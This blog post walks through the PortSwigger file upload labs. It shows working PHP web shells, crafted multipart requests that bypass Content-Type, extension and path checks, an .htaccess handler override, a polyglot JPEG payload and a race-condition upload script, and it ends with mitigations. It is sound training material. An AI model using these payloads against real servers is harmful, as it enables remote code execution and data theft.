---
layout: post
title: "File upload vulnerabilities"
date: 2025-06-29 00:00:00 +0100
categories: [portswigger, hacking]
tags: [file upload vulnerabilities, labs, theory, web]
---

![file_upl](pics/file_upl.png)

### Intro
File upload vulnerabilities occur when a web application improperly handles user-uploaded files, allowing attackers to upload malicious files such as web shells, scripts, or executables. These can lead to remote code execution (RCE), data exfiltration, denial of service (DoS), or complete system compromise.

*Common File Upload Vulnerabilities*
- Unrestricted File Upload: Uploading `shell.php` and accessing it via `https://target.com/uploads/shell.php`
- MIME Type Bypass: Uploading a PHP shell disguised as image.png with c`ontent-type image/png`, but actual content is PHP code.
- File Extension Spoofing: `shell.php.jpg` or `shell.jpg%00.php` bypassing extension filters.
- Remote Code Execution (RCE): Uploading `cmd.jsp` on a Tomcat server and executing system commands via URL parameters.
- Path Traversal in File Name: Uploading file named `../../../../etc/passwd` or `..%2f..%2fwebshell.php` to write outside intended directory.
- Overwriting Existing Files: Uploading index.html to overwrite the homepage or `.htaccess` to modify server behavior.
- Malicious File Content (e.g. XSS in SVG): Uploading an .svg with embedded `<script>alert(1)</script>`, triggering stored XSS.
- Denial of Service via Large File or ZIP Bomb: Uploading a 10GB file or a `.zip` containing billions of nested files.
- Insecure Direct Object Reference (IDOR) on Uploads: Accessing `https://target.com/uploads/1234.pdf` of another user without authorization.
- Missing Access Controls: Any user can view or download sensitive files without being authenticated.

### File upload vulnerabilities labs (Apprentice)

#### Lab: Remote code execution via web shell upload
- Creating simple php shell: `echo '<?php system($_GET['cmd']); ?>' >  shell.php`
- Go to /My_account and upload this file as an avatar (pay attention that app will write you path where your avatar was uploaded)
- Next - open uploaded file and get info you need: `https://<YOUR-LAB>.web-security-academy.net/files/avatars/shell.php?cmd=ls`

#### Lab: Web shell upload via Content-Type restriction bypass
- If we will try to upload same file we will see an error, let's intercept the request

```html
POST /my-account/avatar HTTP/2
Host: <YOUR-LAB>.web-security-academy.net
Cookie: session=WReNf1iG7WqgGyFOPoYeqXAzdQIJvfFu; session=b5beGOHGTtqnRitgQQZ07Z7bWwf6d9Kl
Content-Length: 433
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://<YOUR-LAB>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryM7J10YcS0wUBhrAu
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<YOUR-LAB>.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryM7J10YcS0wUBhrAu
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/php

<?php system($_GET[cmd]); ?>

------WebKitFormBoundaryM7J10YcS0wUBhrAu
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryM7J10YcS0wUBhrAu
Content-Disposition: form-data; name="csrf"

SGa42lnGxEBW6DarUIynepkosPbuMG6G
------WebKitFormBoundaryM7J10YcS0wUBhrAu--
```
- Pay attention for a content type of the file, let's change it to `image/png` and we done

```bash
curl https://<YOUR-LAB>.web-security-academy.net/files/avatars/shell.php?cmd=cat+/home/carlos/secret
```

### File upload vulnerabilities labs (Practitioner)

#### Lab: Web shell upload via path traversal
- Now we don't have problems to upload file but it is not possible to execute it (from the current directory!) so let's upload our file in other place:

```html
POST /my-account/avatar HTTP/2
Host: <YOUR-LAB>.web-security-academy.net
Cookie: session=8PnyH9gT9TaHNGPCrb8Nlgd50Yp26fWE
Content-Length: 439
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://<YOUR-LAB>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary375AjJCiwJyeaJ4A
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<YOUR-LAB>.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundary375AjJCiwJyeaJ4A
Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"
Content-Type: text/plain

<?php system($_GET[cmd]); ?>

------WebKitFormBoundary375AjJCiwJyeaJ4A
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary375AjJCiwJyeaJ4A
Content-Disposition: form-data; name="csrf"

bU0QUo7DqT54YEEOYYBdjCplgthRMLJC
------WebKitFormBoundary375AjJCiwJyeaJ4A--
```

- Pay attention to this part: `Content-Disposition: form-data; name="avatar"; filename="..%2fshell.php"`
- And in the response you can see: `The file avatars/../shell.php has been uploaded`
- Now let's try to read like this:

```bash
curl https://<YOUR-LAB>.web-security-academy.net/files/avatars/../shell.php?cmd=cat+/home/carlos/secret
```

#### Lab: Web shell upload via extension blacklist bypass
- No we need to bypass blacklist, so we will send upload request to repeater twice this time:

```html
POST /my-account/avatar HTTP/2
Host: <YOUR-LAB>.web-security-academy.net
Cookie: session=Tmy0RH9Yv843nAfcSmze8YGVfYahEDwe
Content-Length: 441
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://<YOUR-LAB>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjNq5xeAFlx4KjOkk
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<YOUR-LAB>.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: image/jpg

AddType application/x-httpd-php .jpg

------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="csrf"

qbxRKtCPudYlPLWo5aKPyKH1pd0D5QrL
------WebKitFormBoundaryjNq5xeAFlx4KjOkk--
```

- Pay attention - in first requset in Burp we changed couple things - now `filename=".htaccess"` and `Content-Type: image/jpg`, because now our server will think that .jpg files should be treated as .php files - `AddType application/x-httpd-php .jpg`
- And second will looks like this (file with cmd and pay attention to filename `filename="expl.jpg"` and `Content-Type: image/jpeg`):

```html
POST /my-account/avatar HTTP/2
Host: <YOUR-LAB>.web-security-academy.net
Cookie: session=Tmy0RH9Yv843nAfcSmze8YGVfYahEDwe
Content-Length: 433
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="137", "Not/A)Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Origin: https://<YOUR-LAB>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjNq5xeAFlx4KjOkk
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://<YOUR-LAB>.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="avatar"; filename="expl.jpg"
Content-Type: image/jpeg

<?php system($_GET[cmd]); ?>

------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundaryjNq5xeAFlx4KjOkk
Content-Disposition: form-data; name="csrf"

qbxRKtCPudYlPLWo5aKPyKH1pd0D5QrL
------WebKitFormBoundaryjNq5xeAFlx4KjOkk--
```

- Next like in previous labs:

```bash
curl https://<YOUR-LAB>.web-security-academy.net/files/avatars/expl.jpg?cmd=cat+/home/carlos/secret
```

#### Lab: Web shell upload via obfuscated file extension
- Chandge case - `exploit.pHp`
- Provide multiple extensions - `exploit.php.jpg`
- Add trailing characters. Some components will strip or ignore trailing whitespaces, dots, and suchlike: `exploit.php.`
- Try using the URL encoding (or double URL encoding) for dots, forward slashes, and backward slashes. If the value isn't decoded when validating the file extension, but is later decoded server-side, this can also allow you to upload malicious files that would otherwise be blocked: `exploit%2Ephp`
- Add semicolons or URL-encoded null byte characters before the file extension. If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg` or `exploit.asp%00.jpg`
- Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E, xC4 xAE or xC0 xAE` may be translated to x2E if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.
- Check for stripping - `exploit.p.phphp`

Actual lab solution:
- Just upload regular .php file, intercept request and change filename using null bytes: `filename="shell.php%00.jpg"`

#### Lab: Remote code execution via polyglot web shell upload
- In the theory before the lab we already have written `Using special tools, such as ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.`
- So let's do that:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell-img.jpg
```

- When uploading intercept and change extension to `.php` and check this path:

```bash
curl https://<YOUR-LAB>.web-security-academy.net/files/avatars/shell-img.php?cmd=cat+/home/carlos/secret
```

### File upload vulnerabilities labs (Expert)

#### Lab: Web shell upload via race condition
- Because of the name of the lab I decided to just write a python script for this race condition:

```python
from concurrent.futures import ThreadPoolExecutor

import requests

POST_URL = "https://<YOUR-LAB>.web-security-academy.net/my-account/avatar"
SHELL_URL = (
    "https://<YOUR-LAB>.web-security-academy.net/files/avatars/shell.php"
)
COOKIIES = {"session": "UZnvQQTTCVLAWJYwujyJj7OXUwvU1ESm"}  # put yours
CSRF_TOKEN = "OUYGAW5i3dhSuNnTVHjctfdXiNmuUzFl"  # put yours

def post_req():
    data = {"user": "wiener", "csrf": CSRF_TOKEN}
    files = {"avatar": ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php")}
    resp = requests.post(POST_URL, cookies=COOKIIES, data=data, files=files)
    print(f"[POST] {resp.status_code} - {resp.reason}")


def get_req(i):
    params = {"cmd": "cat /home/carlos/secret"}
    resp = requests.get(SHELL_URL, params=params, cookies=COOKIIES)
    print(f"[GET {i}] {resp.status_code} - {resp.text.strip()}")


with ThreadPoolExecutor(max_workers=11) as executor:
    executor.submit(post_req)
    for i in range(1, 11):
        executor.submit(get_req, i)
```

- Ran it and couple get requests will defiletely bring you the Gem :)


### Mitigation Techniques
*Validate File Type (Server-Side Only)*

- Do NOT rely on MIME type or file extension from the client.
- Use server-side checks like:
- Magic number inspection: *file* or *mimetypes* module in Python, Libraries like *python-magic*, *libmagic*, or *ExifTool*

*Restrict File Extensions*
- Whitelist only necessary extensions.
- Disallow executable extensions like `.php`, `.js`, `.jsp`, `.asp`, `.exe`, `.sh`.

*Sanitize File Names*

- Rename uploaded files using UUIDs or random hashes.
- Avoid using user-supplied file names in the storage path.

*Store Outside Web Root*

- Place uploaded files in a directory that is not web-accessible.
- Serve files through a controlled download mechanism, not direct links.

*Apply Content Security Policy (CSP)*

- Helps mitigate risks if a malicious file is accidentally served.

*Set Correct File Permissions*

- Ensure uploaded files are not executable (chmod 0644 on Unix).
- Use umask settings properly.

*Virus/Malware Scanning*

- Use tools like ClamAV or commercial scanners before saving or processing files.

*Limit Upload Size and Type*

- Define strict limits on file size (e.g., max 10MB) and restrict image/video types if applicable.

*Use Sandboxed Environments*

- For parsing or processing uploaded content (PDF/image/video), isolate the service in a container or sandbox.

*Implement Rate Limiting and Logging*

- Rate-limit uploads and log all upload attempts for monitoring and audit.